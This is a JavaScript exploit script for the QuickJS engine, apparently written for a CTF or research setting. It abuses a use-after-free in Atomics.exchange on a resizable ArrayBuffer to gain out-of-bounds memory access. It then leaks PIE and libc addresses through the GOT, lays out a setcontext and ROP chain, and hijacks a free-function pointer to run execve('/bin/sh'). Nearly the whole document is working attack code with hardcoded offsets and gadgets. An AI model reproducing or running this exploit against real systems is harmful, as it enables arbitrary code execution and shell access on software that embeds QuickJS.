// QuickJS Atomics UAF exploit - execve syscall approach

function hex(n) {
    if (n < 0n) n = n + 0x10000000000000000n;
    return "0x" + n.toString(16);
}

function forceGC() {
    for (let i = 0; i < 10000; i++) { new ArrayBuffer(1024); }
}

// Initial spray
let spray = [];
for (let i = 0; i < 50; i++) { spray.push(new ArrayBuffer(8)); }

// UAF
let ab = new ArrayBuffer(48, { maxByteLength: 4096 });
let view = new BigUint64Array(ab);
let postSpray = [];

let malicious = {
    valueOf: function() {
        ab.resize(2048);
        for (let i = 0; i < 100; i++) { postSpray.push(new ArrayBuffer(8)); }
        postSpray.push(new ArrayBuffer(0x200));
        return 0xFFFFFFFF00010000n;
    }
};

Atomics.exchange(view, 0, malicious);

// Find OOB buffer
let oobBuf = null, oobIdx = -1;
for (let i = 0; i < postSpray.length; i++) {
    if (postSpray[i].byteLength === 0x10000) { oobBuf = postSpray[i]; oobIdx = i; break; }
}
let oobView = new BigUint64Array(oobBuf);

// Find structs
let structs8 = [];
let struct200 = null;
for (let i = 0; i < 6000; i++) {
    let val = oobView[i];
    if (val === 0xFFFFFFFF00000008n) {
        structs8.push({ offset: i, dataPtr: oobView[i + 2], freeFunc: oobView[i + 6] });
    } else if (val === 0xFFFFFFFF00000200n) {
        struct200 = { offset: i, dataPtr: oobView[i + 2] };
    }
}

// Leak
let pieBase = structs8[0].freeFunc - 0x14bc0n;
let gotFree = pieBase + 0x10bc20n;
let readStruct = structs8[1];
let origData = oobView[readStruct.offset + 2];

oobView[readStruct.offset + 2] = gotFree;
oobView[readStruct.offset] = 0xFFFFFFFF00001000n;

let libcBuf = null;
for (let i = 0; i < postSpray.length; i++) {
    if (i !== oobIdx && postSpray[i].byteLength === 0x1000) { libcBuf = postSpray[i]; break; }
}

let libcFree = new BigUint64Array(libcBuf)[0];
let libcBase = libcFree - 0xa3240n;

oobView[readStruct.offset + 2] = origData;
oobView[readStruct.offset] = 0xFFFFFFFF00000008n;

// Gadgets
let binsh = libcBase + 0x1a7ea4n;
let setcontext_35 = libcBase + 0x453e5n;
let call_rdx = libcBase + 0x315b1n;
let pop_rax = libcBase + 0x43c23n;
let syscall = libcBase + 0x28505n;

// Get payload buffer
let payloadBuf = null;
for (let i = 0; i < postSpray.length; i++) {
    if (postSpray[i].byteLength === 0x200) { payloadBuf = postSpray[i]; break; }
}
let payloadView = new BigUint64Array(payloadBuf);
let payloadDataAddr = struct200.dataPtr;

// Layout:
// [+0x00] setcontext+35 (target of call [rdx])
// [+0x68] rdi = /bin/sh
// [+0x70] rsi = argv pointer (point to +0x100 where we'll put argv)
// [+0x88] rdx = NULL (envp)
// [+0xa0] rsp = fake_stack (point to +0xc0)
// [+0xa8] return address = pop_rax
//
// ROP chain at +0xc0:
// [+0xc0] (already popped by setcontext) = pop_rax (first "ret" pops +0xa8)
// Actually, setcontext pushes [rdx+0xa8] and then rets to it
// So we need: [+0xa8] = pop_rax
//             [+rsp] = 59
//             [+rsp+8] = syscall
//
// fake_stack at +0xc0:
// [+0xc0] = 59 (will be popped by pop_rax into rax)
// [+0xc8] = syscall address
//
// argv at +0x100:
// [+0x100] = pointer to /bin/sh
// [+0x108] = NULL

// Fill payload
payloadView[0] = setcontext_35;  // +0x00

// argv array at +0x100
payloadView[0x100/8] = binsh;     // argv[0] = "/bin/sh"
payloadView[0x108/8] = 0n;        // argv[1] = NULL

// fake stack at +0xc0
payloadView[0xc0/8] = 59n;        // value for rax (execve syscall number)
payloadView[0xc8/8] = syscall;    // syscall gadget

// setcontext register setup
payloadView[0x28/8] = 0n;         // r8
payloadView[0x30/8] = 0n;         // r9
payloadView[0x48/8] = 0n;         // r12
payloadView[0x50/8] = 0n;         // r13
payloadView[0x58/8] = 0n;         // r14
payloadView[0x60/8] = 0n;         // r15
payloadView[0x68/8] = binsh;      // rdi = /bin/sh
payloadView[0x70/8] = payloadDataAddr + 0x100n;  // rsi = argv
payloadView[0x78/8] = 0n;         // rbp
payloadView[0x80/8] = 0n;         // rbx
payloadView[0x88/8] = 0n;         // rdx = NULL (envp)
payloadView[0x98/8] = 0n;         // rcx
payloadView[0xa0/8] = payloadDataAddr + 0xc0n;   // rsp = fake stack
payloadView[0xa8/8] = pop_rax;    // return to pop_rax

// Corrupt victim
let victimStruct = structs8[3];
oobView[victimStruct.offset + 2] = payloadDataAddr;
oobView[victimStruct.offset + 6] = call_rdx;

// Find and trigger
let victimBuf = null, victimBufIdx = -1;
for (let i = 0; i < postSpray.length; i++) {
    if (i === oobIdx) continue;
    try {
        let tv = new BigUint64Array(postSpray[i]);
        if (tv[0] === setcontext_35) {
            victimBuf = postSpray[i];
            victimBufIdx = i;
            break;
        }
    } catch(e) {}
}

if (victimBuf) {
    postSpray[victimBufIdx] = null;
    victimBuf = null;
    forceGC();
}
